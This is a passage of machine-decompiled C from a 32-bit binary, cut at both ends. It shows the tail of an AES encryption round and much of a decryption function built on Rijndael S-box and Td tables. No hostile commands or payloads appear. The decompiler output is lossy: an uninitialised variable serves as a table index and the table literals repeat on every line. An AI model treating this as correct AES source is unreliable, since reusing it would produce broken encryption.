    char v70 = *(char *)(v13 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x4030d7
    *(char *)(result + 5) = v70 ^ (char)(v68 / 0x10000);
    char v71 = *(char *)(v14 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x4030f0
    *(char *)(result + 6) = v71 ^ (char)(v68 / 256);
    char v72 = *(char *)((v25 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403105
    *(char *)(result + 7) = v72 ^ (char)v68;
    uint32_t v73 = *(int32_t *)(v62 + 8); // 0x403111
    char v74 = *(char *)(v15 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403114
    *(char *)(result + 8) = v74 ^ (char)(v73 / 0x1000000);
    char v75 = *(char *)(v16 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x40312d
    *(char *)(result + 9) = v75 ^ (char)(v73 / 0x10000);
    char v76 = *(char *)((int32_t)v26 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403146
    *(char *)(result + 10) = v76 ^ (char)(v73 / 256);
    char v77 = *(char *)((v24 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403159
    *(char *)(result + 11) = v77 ^ (char)v73;
    uint32_t v78 = *(int32_t *)(v62 + 12); // 0x403165
    char v79 = *(char *)(v17 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403175
    *(char *)(result + 12) = v79 ^ (char)(v78 / 0x1000000);
    char v80 = *(char *)(v18 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x40318a
    *(char *)(result + 13) = v80 ^ (char)(v78 / 0x10000);
    char v81 = *(char *)(v19 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x40319f
    *(char *)(result + 14) = v81 ^ (char)(v78 / 256);
    char v82 = *(char *)((v22 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x4031ab
    *(char *)(result + 15) = v82 ^ (char)v78;
    return result;
}

// Address range: 0x4031bc - 0x40350f
// Used cryptographic patterns:
//  - AES_Rijndael_Si___ARIA_X1 (8-bit)
//  - Rijndael_Td0__0x51f4a750U_ (32-bit, little endian)
//  - Rijndael_Td1__0x5051f4a7U_ (32-bit, little endian)
//  - Rijndael_Td2__0xa75051f4U_ (32-bit, little endian)
//  - Rijndael_Td3__0xf4a75051U_ (32-bit, little endian)
int32_t function_4031bc(int32_t a1, int32_t result) {
    // 0x4031bc
    int32_t v1; // 0x4031bc
    if (*(char *)(v1 + 4) == 0) {
        // 0x4031ce
        int32_t v2; // bp-48, 0x4031bc
        _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v2);
        _CxxThrowException(&v2, &g17);
        // UNREACHABLE
    }
    unsigned char v3 = *(char *)(a1 + 3); // 0x403207
    int32_t v4 = v1 + 488;
    int32_t v5 = *(int32_t *)v4; // 0x403211
    int32_t v6 = (256 * (int32_t)*(char *)(a1 + 2) | (int32_t)v3) ^ v5; // 0x403211
    int32_t v7 = *(int32_t *)(v1 + 492) ^ (int32_t)*(char *)(a1 + 7); // 0x403235
    int32_t v8 = *(int32_t *)(v1 + 496) ^ (int32_t)*(char *)(a1 + 11); // 0x40325c
    int32_t v9 = *(int32_t *)(v1 + 1040); // 0x40327d
    int32_t v10 = *(int32_t *)(v1 + 500) ^ (int32_t)*(char *)(a1 + 15); // 0x403288
    int32_t v11; // 0x4031bc
    int32_t v12; // 0x4031bc
    int32_t v13; // 0x4031bc
    int32_t v14; // 0x4031bc
    int32_t v15; // 0x4031bc
    int32_t v16; // 0x4031bc
    int32_t v17; // 0x4031bc
    int32_t v18; // 0x4031bc
    int32_t v19; // 0x4031bc
    int32_t v20; // 0x4031bc
    int32_t v21; // 0x4031bc
    int32_t v22; // 0x4031bc
    int32_t v23; // 0x4031bc
    int32_t v24; // 0x4031bc
    int32_t v25; // 0x4031bc
    char v26; // 0x4031bc
    if (v9 < 2) {
        // 0x4031ea
        v19 = v26;
        v18 = v26;
        v17 = v26;
        v16 = v26;
        v15 = v26;
        v14 = v26;
        v13 = v26;
        v12 = v26;
        v11 = v26;
        v20 = v26;
        v21 = v26;
        v23 = v10;
        v24 = v8;
        v25 = v7;
        v22 = v6;
    } else {
        int32_t v27 = v26;
        int32_t v28 = v26;
        int32_t v29 = *(int32_t *)(4 * v27 + (int32_t)&Rijndael_Td2__0xa75051f4U__at_40a3fc); // 0x4032b6
        int32_t v30 = *(int32_t *)(4 * v28 + (int32_t)&Rijndael_Td0__0x51f4a750U__at_409bfc); // 0x4032bf
        int32_t v31 = v26;
        int32_t v32 = *(int32_t *)(4 * v31 + (int32_t)&Rijndael_Td1__0x5051f4a7U__at_409ffc); // 0x4032cb
        int32_t v33 = v26;
        int32_t v34 = v26;
        int32_t v35 = *(int32_t *)(4 * v34 + (int32_t)&Rijndael_Td0__0x51f4a750U__at_409bfc); // 0x4032e9
        int32_t v36 = *(int32_t *)(4 * v33 + (int32_t)&Rijndael_Td1__0x5051f4a7U__at_409ffc); // 0x4032f0
        int32_t v37 = v26;
        int32_t v38 = v26;
        int32_t v39 = *(int32_t *)(4 * v38 + (int32_t)&Rijndael_Td0__0x51f4a750U__at_409bfc); // 0x40331c
        int32_t v40 = *(int32_t *)(4 * v37 + (int32_t)&Rijndael_Td1__0x5051f4a7U__at_409ffc); // 0x403323
        int32_t v41 = v26;
        int32_t v42 = *(int32_t *)(4 * v41 + (int32_t)&Rijndael_Td2__0xa75051f4U__at_40a3fc); // 0x403332
        int32_t v43 = v26;
        int32_t v44 = v26;
        int32_t v45 = *(int32_t *)(4 * v43 + (int32_t)&Rijndael_Td1__0x5051f4a7U__at_409ffc); // 0x403353
        int32_t v46 = *(int32_t *)(4 * v44 + (int32_t)&Rijndael_Td2__0xa75051f4U__at_40a3fc); // 0x403360
        int32_t v47 = v26;
        int32_t v48 = *(int32_t *)(4 * v47 + (int32_t)&Rijndael_Td0__0x51f4a750U__at_409bfc); // 0x40336f
        int32_t v49 = v9 - 1; // 0x4032a9
        int32_t v50 = v1 + 528; // 0x4032a9
        int32_t v51 = *(int32_t *)((4 * v8 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc); // 0x4032da
        int32_t v52 = v30 ^ v29 ^ v32 ^ v51 ^ *(int32_t *)(v50 - 4); // 0x4032e6
        int32_t v53 = *(int32_t *)((v6 / 64 & 1020) + (int32_t)&Rijndael_Td2__0xa75051f4U__at_40a3fc); // 0x4032fd
        int32_t v54 = *(int32_t *)((4 * v10 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc); // 0x403309
        int32_t v55 = v36 ^ v35 ^ v53 ^ v54 ^ *(int32_t *)v50; // 0x403315
        int32_t v56 = *(int32_t *)((4 * v6 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc); // 0x403339
        int32_t v57 = v40 ^ v39 ^ v42 ^ v56 ^ *(int32_t *)(v50 + 4); // 0x403343
        int32_t v58 = *(int32_t *)((4 * v7 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc); // 0x40337e
        int32_t v59 = v46 ^ v45 ^ v48 ^ v58 ^ *(int32_t *)(v50 - 8); // 0x403388
        v49--;
        v50 += 32;
        v19 = v41;
        v18 = v37;
        v17 = v38;
        v16 = v33;
        v15 = v34;
        v14 = v27;
        v13 = v31;
        v12 = v28;
        v11 = v44;
        v20 = v43;
        v21 = v47;
        v23 = v57;
        v24 = v55;
        v25 = v52;
        v22 = v59;
        while (v49 != 0) {
            int32_t v60 = v52;
            v51 = *(int32_t *)((4 * v55 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc);
            v52 = v30 ^ v29 ^ v32 ^ v51 ^ *(int32_t *)(v50 - 4);
            v53 = *(int32_t *)((v59 / 64 & 1020) + (int32_t)&Rijndael_Td2__0xa75051f4U__at_40a3fc);
            v54 = *(int32_t *)((4 * v57 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc);
            v55 = v36 ^ v35 ^ v53 ^ v54 ^ *(int32_t *)v50;
            v56 = *(int32_t *)((4 * v59 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc);
            v57 = v40 ^ v39 ^ v42 ^ v56 ^ *(int32_t *)(v50 + 4);
            v58 = *(int32_t *)((4 * v60 & 1020) + (int32_t)&Rijndael_Td3__0xf4a75051U__at_40a7fc);
            v59 = v46 ^ v45 ^ v48 ^ v58 ^ *(int32_t *)(v50 - 8);
            v49--;
            v50 += 32;
            v19 = v41;
            v18 = v37;
            v17 = v38;
            v16 = v33;
            v15 = v34;
            v14 = v27;
            v13 = v31;
            v12 = v28;
            v11 = v44;
            v20 = v43;
            v21 = v47;
            v23 = v57;
            v24 = v55;
            v25 = v52;
            v22 = v59;
        }
    }
    int32_t v61 = 32 * v9 + v4; // 0x4033a6
    uint32_t v62 = *(int32_t *)v61; // 0x4033a6
    char v63 = *(char *)(v21 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4033c1
    *(char *)result = v63 ^ (char)(v62 / 0x1000000);
    char v64 = *(char *)(v20 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4033d8
    *(char *)(result + 1) = v64 ^ (char)(v62 / 0x10000);
    char v65 = *(char *)(v11 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4033eb
    *(char *)(result + 2) = v65 ^ (char)(v62 / 256);
    char v66 = *(char *)((v25 & 255) + 